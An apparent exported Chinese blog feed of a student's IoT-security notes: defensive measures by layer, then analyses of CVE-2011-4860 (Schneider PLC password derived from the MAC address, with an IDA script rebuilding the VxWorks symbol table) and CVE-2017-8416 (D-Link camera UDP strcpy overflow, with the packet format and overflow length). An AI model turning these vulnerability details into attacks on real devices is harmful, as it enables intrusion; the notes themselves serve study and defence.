        <category>IoT安全入门</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT安全入门08</title>
    <url>/2023/03/28/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IoT%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A808/</url>
    <content><![CDATA[<h1 id="第八章-物联网安全防护"><a href="#第八章-物联网安全防护" class="headerlink" title="第八章 物联网安全防护"></a>第八章 物联网安全防护</h1><h2 id="0x01-物联网各层防御措施讲解"><a href="#0x01-物联网各层防御措施讲解" class="headerlink" title="0x01 物联网各层防御措施讲解"></a>0x01 物联网各层防御措施讲解</h2><h3 id="1-硬件层的防御措施"><a href="#1-硬件层的防御措施" class="headerlink" title="1. 硬件层的防御措施"></a>1. 硬件层的防御措施</h3><ul>
<li>使用独特的螺丝钉或使用其他方法将硬件的各个部分组合</li>
</ul>
<img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830225934380.png" alt="image-20220830225934380" style="zoom:80%;" />

<span id="more"></span>

<ul>
<li>隐藏主控芯片引脚和型号信息</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830230135190.png" alt="image-20220830230135190"></p>
<ul>
<li>固件分离式存储</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830230306314.png" alt="image-20220830230306314"></p>
<ul>
<li>隐藏调试接口</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830230418950.png" alt="image-20220830230418950"></p>
<ul>
<li>防止侧信道攻击</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830230527627.png" alt="image-20220830230527627"></p>
<h3 id="2-固件层的防御措施"><a href="#2-固件层的防御措施" class="headerlink" title="2. 固件层的防御措施"></a>2. 固件层的防御措施</h3><h4 id="2-1-为什么进行固件签名"><a href="#2-1-为什么进行固件签名" class="headerlink" title="2.1 为什么进行固件签名"></a>2.1 为什么进行固件签名</h4><ul>
<li><p>攻击者在其他入侵系统尝试失败后可能利用的攻击媒介之一，是让系统拥有者安装更改过的应用、固件或者其他软件模块。修改后的软件可能包含具有特定用途的恶意代码。一个常见建议是不安装来源不完全信任的软件。</p>
</li>
<li><p>签名固件由软件供应商实施，它使用私钥（密码）来对固件映像进行签名。当固件附加有此签名时，设备将在安装前验证固件。如果设备侦测到固件完整性受损，固件升级将被拒绝。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316145332953.png" alt="image-20230316145332953"></p>
</li>
</ul>
<h4 id="2-2-固件加密"><a href="#2-2-固件加密" class="headerlink" title="2.2 固件加密"></a>2.2 固件加密</h4><p>　　设备的安全性分析是 IoT 安全审计中非常重要的部分。获取固件是分析中的众多挑战之一，你可以通过多种技术来做到这一点。拥有固件后，就可以对其进行更仔细的分析。供应商已开始以加密的形式在服务器上存储固件，因此，即使你获取了固件，在进行进一步分析之前仍然需要对其进行解密。</p>
<h4 id="2-3-固件混淆"><a href="#2-3-固件混淆" class="headerlink" title="2.3 固件混淆"></a>2.3 固件混淆</h4><ul>
<li>代码混淆（obfuscation）是将计算机程序的代码，转换成功能上等价，但是难于阅读和理解的形式的行为。</li>
<li>代码混淆可以用于程序源代码，也可以用于程序编译而成的中间代码。执行代码混淆的程序被称为代码混淆器。目前已经存在许多种功能各异的代码混淆器。</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316150011002.png" alt="image-20230316150011002"></p>
<h4 id="2-4-安全启动"><a href="#2-4-安全启动" class="headerlink" title="2.4 安全启动"></a>2.4 安全启动</h4><ul>
<li>在传输期间能够物理访问设备的攻击者可能会执行攻击，例如：降低设备的启动分区，从而绕过固件完整性检查，以便在部署设备之前安装已更改的恶意固件。</li>
<li>安全启动是一种由加密验证软件的完整（性）的链组成的引导过程，可从不可变的内存（引导ROM）开始。安全启动基于签名固件的使用，可确保设备仅能使用已授权的固件启动。</li>
<li>启动ROM验证启动程序时启动引导过程。安全引导，然后以实时的方式验证从山村中加载的每个固件块的嵌入式签名。启动ROM时信任的根，仅在验证每个签名时，才会继续执行启动过程。链的每个部分都验证下一部分，导致已验证的Linux内核和经验证的根文件系统。</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316151102565.png" alt="image-20230316151102565"></p>
<h4 id="2-5-TPM"><a href="#2-5-TPM" class="headerlink" title="2.5 TPM"></a>2.5 TPM</h4><ul>
<li>传统上来讲，TPM是焊接到计算机主板的离散芯片。此类实现允许计算机的原始设备制造商（OEM）评估和认证独立于系统其他部分的TPM。尽管离散TPM实现仍然很常见，但他们对于较小或电源消耗低的集成设备可能有问题。某些较新的TPM实现将TPM功能集成到与其他平台组件相同的芯片集中，同时仍然提供类似于离散TPM芯片的逻辑分离。</li>
<li>TPM是被动的：他们接收命令并返回相应。若要实现TPM的完整优势，OEM必须仔细地将系统硬件和固件与TPM集成，以向其发送命令，并对它的响应做出反应。</li>
</ul>
<h4 id="2-6-MCU"><a href="#2-6-MCU" class="headerlink" title="2.6 MCU"></a>2.6 MCU</h4><p>主要针对引导过程中的恶意代码</p>
<ul>
<li>对于从外部SPI闪存启动的操作系统，Microchip技术引入了其最新的加密微控制器（MCU），以防止rootkit和bootkit恶意软件，从而实现了安全引导，硬件根信任保护。</li>
<li>使用硬件根信任的安全引导对于在系统中加载威胁之前保护系统免受威胁至关重要，并且只允许系统使用制造商信任的软件引导。</li>
</ul>
<h3 id="3-嵌入式WEB的防御措施"><a href="#3-嵌入式WEB的防御措施" class="headerlink" title="3. 嵌入式WEB的防御措施"></a>3. 嵌入式WEB的防御措施</h3><h4 id="3-1-及时升级更新固件"><a href="#3-1-及时升级更新固件" class="headerlink" title="3.1 及时升级更新固件"></a>3.1 及时升级更新固件</h4><p>　　设备固件应即使检测新版本，老旧的固件存在漏洞的概率是很大的，如果厂商通知旧版固件存在安全隐患，更应该立即更新或安装补丁，防止被恶意利用。</p>
<p>　　固件开发人员应密切关注gohead lighttpd等webServer的漏洞发布并及时更新</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316152609136.png" alt="image-20230316152609136"></p>
<h4 id="3-2-对传递的数据转义"><a href="#3-2-对传递的数据转义" class="headerlink" title="3.2 对传递的数据转义"></a>3.2 对传递的数据转义</h4><p>　　防xss是后端人员的责任，后端应该在所有用户提交数据的接口，对敏感特殊字符进行屏蔽或转义，才能进行下一步操作。</p>
<p>　　所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，才可以插入到页面中。</p>
<h4 id="3-3-不预留后门"><a href="#3-3-不预留后门" class="headerlink" title="3.3 不预留后门"></a>3.3 不预留后门</h4><p>　　Cisco、TP-Link、Netgear、Tenda、D-link等主流网络设备生产厂商的多款路由器产品，均存在远程命令执行，超级用户权限等预置后门。</p>
<p>　　虽然方便管理等其他用途，但是黑客可借此取得路由器的远程控制权，进而发起DNS劫持、窃取信息等攻击。</p>
<p>　　如果发现厂商预留后门，应立即检测固件升级，或限制网络访问。</p>
<h3 id="4-协议层的防御措施"><a href="#4-协议层的防御措施" class="headerlink" title="4. 协议层的防御措施"></a>4. 协议层的防御措施</h3><h4 id="4-1-wifi"><a href="#4-1-wifi" class="headerlink" title="4.1 wifi"></a>4.1 wifi</h4><ul>
<li>wifi开发使用最新版协议栈，ap 使用 wpa&#x2F;wpa2 模式并且密码长度设置成16位以上，使用数字、字母、大小写、特殊符号混排形式。</li>
<li>在设置WIFI时，如果禁用”允许SSID广播”功能，也会增加WIFI的安全性，防止恶意链接攻击设备。</li>
</ul>
<h4 id="4-2-Zigbee"><a href="#4-2-Zigbee" class="headerlink" title="4.2 Zigbee"></a>4.2 Zigbee</h4><ul>
<li>Zigbee通信信任中心链接密钥不使用默认值</li>
<li>使用高级安全模式，预安装密钥</li>
<li>使用最新版本协议栈</li>
</ul>
<h4 id="4-3-BLE"><a href="#4-3-BLE" class="headerlink" title="4.3 BLE"></a>4.3 BLE</h4><ul>
<li>通信连接不使用Just Work模式</li>
<li>发现通报漏洞及时给设备升级固件</li>
<li>在应用层对数据加密再进行传输</li>
</ul>
<h4 id="4-4-RFID-Mqtt"><a href="#4-4-RFID-Mqtt" class="headerlink" title="4.4 RFID&amp;Mqtt"></a>4.4 RFID&amp;Mqtt</h4><ul>
<li>使用安全性更高的cpu卡</li>
<li>对卡内数据进行加密存储</li>
<li>及时对服务器内存储数据检查</li>
<li>mqtt使用tls对数据加密通信</li>
</ul>
<h3 id="5-应用层的防御措施"><a href="#5-应用层的防御措施" class="headerlink" title="5.应用层的防御措施"></a>5.应用层的防御措施</h3><h4 id="5-1-签名验证"><a href="#5-1-签名验证" class="headerlink" title="5.1 签名验证"></a>5.1 签名验证</h4><p>为了防止自己的应用被反编译后重新打包，可以采取运行时进行签名校验。PackageManager类中提供查看当前程序签名的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Signature[]=context.getPackageManager().getPackageInfo(packageName, PackageManager.GET_SIGNATURES).signatures</span><br></pre></td></tr></table></figure>

<h4 id="5-2-应用加固"><a href="#5-2-应用加固" class="headerlink" title="5.2 应用加固"></a>5.2 应用加固</h4><p>可以使用360 爱加密等服务商提供的加壳服务，或对应用内程序以及资源以及字符串混淆与加密。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316160738529.png" alt="image-20230316160738529"></p>
<h4 id="5-3-SSL-Pinning"><a href="#5-3-SSL-Pinning" class="headerlink" title="5.3 SSL-Pinning"></a>5.3 SSL-Pinning</h4><p>在开发时就服务端证书一块打包到客户端里。在HTTPS建立时与服务端返回的证书比对一致性，如果识别出中间人攻击后直接在客户端侧中止连接。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316161114759.png" alt="image-20230316161114759"></p>
<h4 id="5-4-发布release版本"><a href="#5-4-发布release版本" class="headerlink" title="5.4 发布release版本"></a>5.4 发布release版本</h4><p>在应用发布时编译为release版本，debug版本数据包防止外流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android:exported=false</span><br><span class="line">android:debugged=&quot;false&quot;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>IoT安全入门</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>科研记录0x00</title>
    <url>/2023/04/01/%E7%A7%91%E7%A0%94%E8%AE%B0%E5%BD%95&amp;%E7%AC%94%E8%AE%B0/%E7%A7%91%E7%A0%94%E8%AE%B0%E5%BD%950x00/</url>
    <content><![CDATA[<p>准备开一个坑《研究牲科研记录》，记录下在做科研途中学习的东西，或者一些整理好的文档，或者心血来潮了写的东西，主打的就是一个随意。</p>
<p>本人某末9网安研究牲一枚，研究方向是IoT安全，目标是顺利毕业（恩，是挺没有追求）。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230401210332783.png" alt="image-20230401210332783"></p>
]]></content>
      <categories>
        <category>研究牲科研记录</category>
      </categories>
      <tags>
        <tag>研究牲</tag>
        <tag>科研随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>科研记录0x01</title>
    <url>/2023/04/01/%E7%A7%91%E7%A0%94%E8%AE%B0%E5%BD%95&amp;%E7%AC%94%E8%AE%B0/%E7%A7%91%E7%A0%94%E8%AE%B0%E5%BD%950x01/</url>
    <content><![CDATA[<h1 id="两个CVE的漏洞分析"><a href="#两个CVE的漏洞分析" class="headerlink" title="两个CVE的漏洞分析"></a>两个CVE的漏洞分析</h1><p>根据课题研究方向搜到的2个CVE，师叔让写一个漏洞分析文档，在这留档记录下。</p>
<h2 id="CVE-2011-4860"><a href="#CVE-2011-4860" class="headerlink" title="CVE-2011-4860"></a>CVE-2011-4860</h2><p><strong>相关设备：</strong>施耐德PLC工控设备</p>
<p><strong>设备型号：</strong>NOE71101</p>
<p><strong>漏洞描述：</strong>NOE 771设备（又名Quantum 140NOE771* 模块）上的施耐德电气Quantum 以太网模块中的ComputePassword 功能通过对MAC 地址执行计算生成fwupgrade 帐户的密码，这使得远程攻击者更容易获得访问权限通过(1) ARP 请求消息或(2) 邻居请求消息。”</p>
<p><strong>固件下载地址：</strong><a href="https://github.com/ameng929/NOE77101_Firmware">https://github.com/ameng929/NOE77101_Firmware</a></p>
<span id="more"></span>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在目录 \FLASH0\wwwroot\conf\exec 下，NOE77101.bin 就是要分析的固件。</p>
<p>使用binwalk提取过后，可以看到固件是Vxworks操作系统，PowerPC架构大端序</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/clip_image002.jpg" alt="img"></p>
<p>最后一行信息能看到符号表的地址是0x301E74，在后边恢复符号表时会用到。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230401211315697.png" alt="image-20230401211315697"></p>
<p>使用IDA32打开385文件，选择PowerPC big endian，之后会让填写ROM的起始地址，这里得到是0x10000（好像也是固件常用基址）。在ROM start address和Loading address 处填入后，一路默认。</p>
<img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230401213102913.png" alt="image-20230401213102913" style="zoom: 67%;" />

<p>进入到主界面后，导入符号表重建脚本重建符号表，上边已经得到了符号表起始地址0x301E74，再通过HxD找到符号表终止地址0x3293B4，idc脚本见rebuild.idc</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* rebuild.idc */</span></span><br><span class="line"><span class="comment">/* Ruben Santamarta - IOActive */</span></span><br><span class="line"><span class="comment">/* Rebuild VxWorks Symbol Table */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">auto</span> load_addr;</span><br><span class="line">	 <span class="keyword">auto</span> ea;</span><br><span class="line">	 <span class="keyword">auto</span> offset;</span><br><span class="line">	 <span class="keyword">auto</span> sName;</span><br><span class="line">	 <span class="keyword">auto</span> eaStart;</span><br><span class="line">	 <span class="keyword">auto</span> eaEnd; </span><br><span class="line"></span><br><span class="line">	<span class="comment">// You&#x27;ll need to adjust these values</span></span><br><span class="line">	load_addr = <span class="number">0x10000</span>; <span class="comment">/* 加载地址 */</span> </span><br><span class="line">	eaStart = <span class="number">0x301E74</span> + load_addr; <span class="comment">/* 符号表起始地 */</span></span><br><span class="line">	eaEnd = <span class="number">0x3293b4</span> + load_addr; <span class="comment">/* 符号表结束地址 */</span></span><br><span class="line">	</span><br><span class="line">	 SetStatus(IDA_STATUS_WORK);</span><br><span class="line">	 ea = eaStart;</span><br><span class="line">	 </span><br><span class="line">	 <span class="keyword">while</span>( ea &lt; eaEnd) &#123;</span><br><span class="line">	 	MakeDword( ea );</span><br><span class="line">	 	offset = <span class="number">0</span>;</span><br><span class="line">	 	<span class="keyword">if</span> ( Dword( ea ) == <span class="number">0x900</span> || Dword( ea ) == <span class="number">0x500</span>)</span><br><span class="line">	 	&#123;</span><br><span class="line">	 		offset = <span class="number">8</span>;</span><br><span class="line">	 	&#125;</span><br><span class="line">	 	<span class="keyword">else</span> <span class="keyword">if</span>( Dword( ea ) == <span class="number">0x90000</span> || Dword( ea ) == <span class="number">0x50000</span> )</span><br><span class="line">	 	&#123;	</span><br><span class="line">	 		offset = <span class="number">0xc</span>;</span><br><span class="line">	 	&#125;	 	</span><br><span class="line">	 	<span class="keyword">if</span>( offset )</span><br><span class="line">	 	&#123;</span><br><span class="line">	 		MakeStr( Dword( ea - offset ), BADADDR);	 		</span><br><span class="line">	 		sName = GetString( Dword( ea - offset ), <span class="number">-1</span>, ASCSTR_C ) ; </span><br><span class="line">	 	 	<span class="keyword">if</span> ( sName )</span><br><span class="line">	 	 	&#123;</span><br><span class="line">	 	 		<span class="keyword">if</span>( Dword( ea ) == <span class="number">0x500</span> || Dword( ea ) == <span class="number">0x50000</span>)</span><br><span class="line">	 	 		&#123;</span><br><span class="line">	 	 	    	<span class="keyword">if</span> (  GetFunctionName( Dword( ea - offset + <span class="number">4</span>) ) == <span class="string">&quot;&quot;</span> )</span><br><span class="line">	 	 	    	&#123;</span><br><span class="line">	 	 	    		MakeCode( Dword( ea - offset + <span class="number">4</span>) );</span><br><span class="line">	 					MakeFunction( Dword( ea - offset + <span class="number">4</span>), BADADDR );	</span><br><span class="line">	 	 	    	&#125;</span><br><span class="line">	 	 	    &#125;</span><br><span class="line">	 	 		MakeName( Dword( ea - offset + <span class="number">4</span> ), sName ); 	 		</span><br><span class="line">	 	 	&#125;</span><br><span class="line">	 	&#125;</span><br><span class="line">	 	ea = ea + <span class="number">4</span>; 	 	 	</span><br><span class="line">	 &#125;</span><br><span class="line">	 </span><br><span class="line">	 SetStatus(IDA_STATUS_READY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修复好后可以在函数栏看到修复后的函数名称，这个固件的漏洞发生在 ComputePassword 函数中，这个函数在 usrAppInit 函数内被调用。首先进入 usrAppInit 函数，使用IDA反汇编后，得到的伪代码如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/clip_image002-1680354908108.jpg" alt="img"></p>
<p>v12 通过调用 GetEthMAC 函数获得设备的 mac 地址，然后下边的 sprintf 函数把 mac 地址赋值给了v13，接着做为 ComputePassword 函数的参数。这里用IDA反汇编的不是特别好，在博客上看到别人用 Ghidra 反汇编得到的结果要比IDA直观些，于是在 ghidra 上进行反汇编，同样要重建符号表，Github上有别人写好的 <a href="https://github.com/PAGalaxyLab/vxhunter">ghidra 脚本</a>，根据 readme 将脚本导入 ghidra ，运行脚本（vxhunter_firmware_init.py）进行自动修复和分析，反编译后 usrAppInit 的伪代码如下所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230401213235219.png" alt="image-20230401213235219"></p>
<p>v12 对应 local_50（mac地址），v13 对应 acStack72 ，从 ghidra 反汇编的结果中 sprintf 函数的参数可以看到，mac 地址是通过数组的形式分段存放的。</p>
<p>进入到 ComputePassword 函数中，反编译查看源码如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/clip_image002-1680355090691.jpg" alt="img"></p>
<p>同样在 ghidra 中看一下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/clip_image004.jpg" alt="img"></p>
<p>ComputePassword 函数首先用 strcpy 给 param_2 赋了一个值，这个值可以看到为 0x ：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/clip_image006.jpg" alt="img"></p>
<p>然后用 strcat 函数，把 param_2 和 *(param_1+3) 拼接在一起。param_1 对应 acStack72（mac），接着，函数对包含 mac 的 param_2 经过一些运算后，最后将结果保存在 param_2（也就是 acStack56 ）中并返回。</p>
<p>紧接着，usrAppInit 函数调用 loginDefaultEncrypt 函数，参数为 acStack56 和 &amp;DAT_00342044 ，查看该函数：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/clip_image008.jpg" alt="img"></p>
<p>这个函数看的也不是特别懂，但是大致功能是对 acStack56（通过 ComputePassword 计算得到的）做一些操作，然后保存到 &amp;DAT_00342044 这个地方。紧接着在 loginUserAdd 函数中，将 &amp;DAT_00342044 作为账户 s_fwupgrade 的密码。</p>
<p>整个过程概括下来就是，ComputePassword 函数接收mac地址作为参数输入，计算得到账户 s_fwupgrade 的密码，函数内部的计算过程也不算复杂，从而导致了漏洞的产生。</p>
<p><strong>参考链接：</strong></p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_35029061/article/details/125884395">https://blog.csdn.net/qq_35029061/article/details/125884395</a></p>
<p><a href="https://blog.csdn.net/qq_35029061/article/details/125884434">https://blog.csdn.net/qq_35029061/article/details/125884434</a></p>
</blockquote>
<h2 id="CVE-2017-8416"><a href="#CVE-2017-8416" class="headerlink" title="CVE-2017-8416"></a>CVE-2017-8416</h2><p><strong>相关设备：</strong>摄像头</p>
<p><strong>设备型号：</strong>D-Link DCS-1100&#x2F;1130</p>
<p><strong>漏洞描述：</strong>设备在UDP端口5978上运行一个自定义守护进程，称为 “dldps2121”，监听设置为255.255.255.255的报文或广播报文。这个守护进程处理自定义 Dlink 基于UDP的协议，允许 Dlink 移动应用程序和桌面应用程序发现本地网络上的 Dlink 设备。这主要是有用的设置设备使用这些应用程序，并提供用户友好性方面。二进制以 “main” 功能处理从任何设备发送的UDP数据包。函数中的一条路径遍历处理数据包的代码块，该代码块执行无界复制操作，允许溢出缓冲区。</p>
<p>Dlink创建的自定义协议遵循以下模式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Packetlen, Type of packet; M=MAC address of device or broadcast; D=Device Type;C=base64 encoded command string;test=1111</span><br></pre></td></tr></table></figure>

<p>dldps2121程序中，从地址 0x0000DBF8 开始的地址函数处理整个UDP数据包，并使用地址 0x0000DC88 的 strcpy 函数执行不安全拷贝。</p>
<p><strong>固件下载地址：</strong><a href="http://legacyfiles.us.dlink.com/DCS-1130/REVA/FIRMWARE/DCS-1130_REVA_FIRMWARE_1.08.8707.ZIP">http://legacyfiles.us.dlink.com/DCS-1130/REVA/FIRMWARE/DCS-1130_REVA_FIRMWARE_1.08.8707.ZIP</a></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>使用 binwalk 提取固件文件系统，固件为 cramfs 文件系统，32位 arm 架构，dldps2121 程序位于 &#x2F;cramfs-root-0 目录下，导入到IDA32进行分析。</p>
<p>根据漏洞信息的提示，程序在DBF8函数处理UDP数据包，查看DBF8函数的反编译后的伪代码：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/clip_image002-1680355555021.jpg" alt="img"></p>
<p>a1 参数应该是接收到的UDP数据包数据，函数首先将数据赋值给 v10 ，然后通过strstr函数找到字符串“D&#x3D;”在UDP数据包中第一次出现的位置并赋值给 v5，然后将 “D&#x3D;” 后边的内容通过不安全的strcpy函数复制到 v6 处，这里由于 strcpy 函数本身的不安全性，导致存在缓冲区溢出漏洞。根据UDP数据包的格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Packetlen, Type of packet; M=MAC address of device or broadcast; D=Device Type;C=base64 encoded command string;test=1111</span><br></pre></td></tr></table></figure>

<p>“D&#x3D;” 前边是包的类型和设备的 MAC 地址，所以，只要我们获得了设备的 MAC 地址，我们就能利用 strcpy 函数存在的缓冲区溢出漏洞，对该设备发送构造好的UDP数据包执行攻击。</p>
<p><strong>采用文档里的说法：</strong>此处的 strcpy 函数会导致在1060个字符之后溢出堆栈指针，从而允许控制PC寄存器并导致代码执行。任何进程都可以发起相同形式的通信，包括手机或桌面上的攻击者进程，这允许设备上的第三方应用程序通过发送一个带有自定义 base64 编码的UDP数据包在设备上执行命令，而无需任何身份验证。</p>
<p>漏洞是在通过对移动应用程序 dink lite 进行渗透测试，并逆向设备上存在的 “dldps2121” 二进制文件发现的。</p>
]]></content>
      <categories>
        <category>研究牲科研记录</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>研究牲</tag>
        <tag>科研随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>2021.07.20河南暴雨--个人流水账纪录</title>
    <url>/2021/07/22/%E9%9A%8F%E7%AC%94/2021.07.20%E6%B2%B3%E5%8D%97%E6%9A%B4%E9%9B%A8--%E4%B8%AA%E4%BA%BA%E6%B5%81%E6%B0%B4%E8%B4%A6%E7%BA%AA%E5%BD%95/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码好像不对哦~~~" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="848fa3832e65e031b55d86e3fd2831eb3660fc4d29d4999516df1acb8272e2b8">01578f387e3c30151972760a57cde3015f026e2cc002eaf859366efa97dfe8d655b31cac7957f83c30e6971a58e814d80c94f6fa720487b855e85939f01a15304edd8cf8b8385e5748355080c20db9a930ed428b7f9145b4a8dbbcd3de7806cff42d52e1e2b2babf7a61bfaf16baddeed441275e4d68d4dc1f705a3de73f9ad04f0693b6db10664bda6c17762a71d2e028b3487ee4daeaa7f0675a56defd72590766210c6f96ed6d9aeace607628d63782c2b03664d23305c4b1b0386a9c6aa887c275efe720775e444892bc7ad045fcbe4896ad7d47b9138464394514e47d60318f8af245e754e771b360896fbc9bf593ac5abbeb7c983528125f48efa51a1e80980040a253e63e83d10f3c39c927866f1aa18b69b6b500ef5b940229164abca745037e3331490aeda65842ce6808014be92e93641495ad0b44b10cbb6d293dd5c41644817b5c76476de58b872198ccd41f9a430fe1ac2390538eaa60f5a835a5382c27f98a3e064a8626aa2033d488f57c8dd807f5c01c27dbbc0406ae328e38b364343105720e4e4df9c2526707688bb51e407c22fec8fa559b1b1aa45134d439f0d81190b912f1f7a184155b85646e406ffd5c7bf14f096233f71edc2b1272d595a7ae786b804152fdf5ae0fe7024ec2df27068efdd6d905d07fdeaf11e6d2b97ebb4d9ad4777e5a0782747ae68983cf12d24587bd26587998d92624186b00c5c9513a309bb59031f50bdc9f1b21d6a21d77e9fb330dd7abfba7fe007b9c132703286968abe8af956ec2989e197bb39aeac1612fec9f805f294fc029c61a3f3480edbd229a1f27e4906aeae5cb4f06c90d33b4915f0994bd7e6d1a780d416cf37bae6ba64892ce30d1573934ad8a59f1390b1e6fb4faa934be1fb5872cebfd6fd071e800cf54a66beaa8ddafb5ce03806177c3fd61281a17b95c3ec8daf004289b0a6d8f213e3aa787acaeda03fa941574984a73e56170a5a917dee814e39624f11ce7cde5b482d267d72edfc4d29a202c54597ad4e0bb5975f1fd4efb24dd0a3f4708c5b5abe5a605e808fbe88524706a4c5adabca619a7683c00e2e9c5191453c0410f1a0b16aec84689cbc8d03a4ce58f8dbc69ff0496faeee67dd890d206ebce2a0e5d9abdd993e270c919ed4fa97e95bc85e8e6a0fe6d0d0d11744f647709e4218d6cd460cda4e2b67ed8597aec5fff73beb56a2e60d0e06a741cf2c9b90b2696a3486e9f7851bac28925c675a58956e110bd5ea766e9cbff965848288ea9d7b09e63ba7a31c69634e51d8ca008614f2caa52ef843c6552bbdbef6659eb48f1c527b701bda3ece2fafc575c7c6d7d4879005ef8ff1ffd01ed21b7aa6bcd89b097429daf65e79adbeebc058cfebffa3c0a41e825c71fd7148cbe79f99fd82e8269c3d8d3cfc043bd62763c2c7f64ea21ed114c74f6c2f30d9b5610fcc1fe22443ddbf6d467822a4ab03a2eb94309e43349abc553f5aba8dff6a677fd94e4d8873baa54f16b5353ced7a9a98c8c7dea7c821dc43f47d3b584313e5956ba2dac0bc71110a627ecf494df83c3197d470f61eaa6c8c1de5abd2e5a000901207db3cce2841bac69f27072477f133d288cd9f19da1d1d4a1316ba62abcef9446faf9dd138e3298b821e6df300663d6f93b10baa28e12c2b9ba9be7412d289a1134497e374131236526171e24646cd12d483fcddc304966a3903ea12959cb5a7d5b34549c5d36e5274d9da1864595c5dbc6e6a667e17e81833a52f7b8111c48b3361b414fa4cc5ffbca712d3130075b7035add607e3701ecf54c40e8c667b858495a1fd3450ca62645c51144222e0c8c858069ee8a13202ffbf52fcc328dcff191741ea249457e1501947c047b87e6e8db0a9e410ac154b146cdf0f3333bdb3fcdaef485933c3c2c25e30249c7fc4f1ecf26cc17b104405ac92c7e631a1fd4c780ad32698f23be2e5e6b1dbfc4042190584dd65dba603182940b1b5112bddc629a469258e7d15751b86ecb29d78878adfa9439844c0146142112260dc85fe81587ee45c95d985381bfd55aef9cad0989437b0b4bf0e20b6c42a165cdfd8345a610560891af95ce1d416eaa5b4926fc6780eb90d2d8113e3b7e6761d3e9275bc8dcb871012edf81a0758280c6c88fcb8f4e8cc86e8ee308eff2a7b95b417edbd20faf40499db691be2ecb11680925f7d34eec42ae478db067c6880160414018b8186bd1d0c11c5a63385de0b72f51f3deb5202cdb94fd7bd6665a7d4505991c4caaafe63c6385b93933b26413b7ad57399fab5bba8a8dbbcee5fde38af3366ef80dd2ea703e5428cbbaf31a296ff3911866fe81dccfae490ef5b304d320eb5560769866f18894d64f7991cf152bc38147f080b1d3cef2827ab4d53985adac7d144b2b062476da539992ef1dabd719641216a8502a83fc611a580cc587b7b9491b374600006d9c20d398dbc739ff27e06aa0e150981d441cee849a77583df9060b9d6fe7accfc88d9e196f3026b787e0259b86b7a10aa8c843a03e8e9496848fec8e121bb74746a37d38ae8af273295b247cc9496a4e5458efc3e4010544fac714bb9c7a9d29c4dc4b100ce534783fa1f77eccca22c55b6637fcc7a5a77db487f4b785499eeb32d6c150e12327c2b1c824b1e2a8d9ce002273d6178d330365da8a38b6cce6c5d9891b46b322651727f240ff4e1bf4caf45380aed0f2f221501b34d296a44b714aa370ddbb8ef898b3524604479b8aced44e8a71997a33cd1f1c32c851ea854dc343abcd581ef4d8f87bf9dc7a3f3f2bb300db646b4a462c85e30d873eb08627d39de327cb9543f737329351cff5d6d0618ad5f0ac91c30d214f64065fb6c239c0f16bbf14baa9b9ba4b047e5413f1ec04ee7df569ce49833760d48a6a6302c3cd8017dc965e7a6a2bd51f23